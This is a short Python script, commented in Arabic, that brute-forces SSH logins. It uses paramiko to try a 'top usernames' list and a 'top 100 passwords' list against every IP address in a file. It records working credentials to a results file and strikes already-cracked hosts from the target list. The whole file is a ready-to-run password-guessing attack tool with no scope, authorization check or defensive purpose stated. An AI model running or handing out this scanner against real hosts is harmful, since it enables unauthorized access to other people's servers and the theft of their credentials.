import paramiko
import os

# دالة لمحاولة الاتصال عبر SSH
def try_ssh(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=5)
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        return False
    finally:
        client.close()

# قراءة بيانات المستخدمين وكلمات المرور من الملفات
def read_file(file_name):
    with open(file_name, 'r') as file:
        return [line.strip() for line in file]

# كتابة بيانات إلى ملف
def write_file(file_name, data):
    with open(file_name, 'w') as file:
        for item in data:
            file.write(item + "\n")

# تعيين متغيرات
ip_file = 'ip_addresses.txt'
user_file = 'top_username_ssh.txt'
password_file = 'top_100_passwords.txt'
results_file = 'valid_ssh_attempts.txt'
skipped_ips_file = 'skipped_ips.txt'

ips = read_file(ip_file)
users = read_file(user_file)
passwords = read_file(password_file)

# قراءة IPs التي تم تخطيها من ملف إن وجد
skipped_ips = set()
if os.path.exists(skipped_ips_file):
    with open(skipped_ips_file, 'r') as file:
        skipped_ips = set(line.strip() for line in file)

# فتح ملف النتائج
with open(results_file, 'w') as result_file:
    for ip in ips:
        if ip in skipped_ips:
            continue  # تخطي IP إذا كان في مجموعة السكب
        for username in users:
            if ip in skipped_ips:
                break  # إذا تم العثور على نجاح مع هذا IP، اخرج من حلقة كلمات المرور
            for password in passwords:
                print(f"Trying {username}@{ip} with password: {password}")
                if try_ssh(ip, username, password):
                    result_file.write(f"Valid credentials found - IP: {ip}, Username: {username}, Password: {password}\n")
                    print(f"[+] Valid credentials found - IP: {ip}, Username: {username}, Password: {password}")
                    
                    # إضافة IP إلى مجموعة السكب وتخزينه في ملف
                    skipped_ips.add(ip)
                    with open(skipped_ips_file, 'a') as skip_file:
                        skip_file.write(ip + "\n")
                    
                    break  # بعد العثور على كلمة مرور صحيحة، أوقف محاولة كلمات المرور الأخرى لهذا المستخدم
            if ip in skipped_ips:
                break  # إذا تم العثور على نجاح مع هذا IP، اخرج من حلقة المستخدمين
        if ip in skipped_ips:
            continue  # إذا تم العثور على نجاح مع هذا IP، اخرج من حلقة IPs

    # تحديث ملف ip_addresses.txt لإزالة IPs التي تم تخطيها
    remaining_ips = [ip for ip in ips if ip not in skipped_ips]
    write_file(ip_file, remaining_ips)
